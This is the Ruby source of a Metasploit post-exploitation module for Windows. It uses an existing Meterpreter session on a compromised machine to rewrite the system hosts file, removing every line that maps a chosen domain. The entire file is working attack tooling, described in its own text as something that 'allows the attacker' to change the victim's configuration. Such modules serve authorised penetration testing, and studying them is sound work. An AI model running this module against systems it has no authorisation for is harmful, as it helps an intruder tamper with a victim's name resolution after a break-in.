##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Host File Entry Removal',
        'Description' => %q{
          This module allows the attacker to remove an entry from the Windows hosts file.
        },
        'License' => BSD_LICENSE,
        'Author' => [ 'vt <nick.freeman[at]security-assessment.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_close
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_tell
              core_channel_write
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('DOMAIN', [ true, 'Domain name to remove from the hosts file.' ])
      ]
    )
  end

  def run
    hosttoremove = datastore['DOMAIN']
    # remove hostname from hosts file
    fd = client.fs.file.new('C:\\WINDOWS\\System32\\drivers\\etc\\hosts', 'r+b')

    # Get a temporary file path
    meterp_temp = Tempfile.new('meterp')
    meterp_temp.binmode

    print_status("Removing hosts file entry pointing to #{hosttoremove}")

    newfile = ''
    fdray = fd.read.split("\r\n")

    fdray.each do |line|
      unless line.match("\t#{hosttoremove}$")
        newfile += "#{line}\r\n"
      end
    end

    fd.close

    meterp_temp.write(newfile)
    meterp_temp.close

    client.fs.file.upload_file('C:\\WINDOWS\\System32\\drivers\\etc\\hosts', meterp_temp)
    print_good('Done!')
  end
end
